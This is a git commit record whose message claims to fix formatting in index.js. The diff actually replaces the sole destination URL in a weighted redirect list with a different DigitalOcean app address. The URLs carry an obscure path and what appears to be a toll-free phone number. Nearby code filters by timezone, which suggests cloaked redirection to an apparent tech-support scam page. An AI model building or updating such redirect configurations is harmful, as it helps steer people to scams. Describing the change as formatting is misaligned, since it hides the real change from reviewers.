df74ca2070958c7433cd9345af17330a9971134c
paalakash <palaksh452@gmail.com>
2026-06-19 12:34:23 +0530

    Fix formatting issues in index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://hammerhead-app-7toau.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-414-5328", weight: 1.0 }
+    { url: "https://stingray-app-smb6k.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-833-414-5328", weight: 1.0 }
 
 ];
 
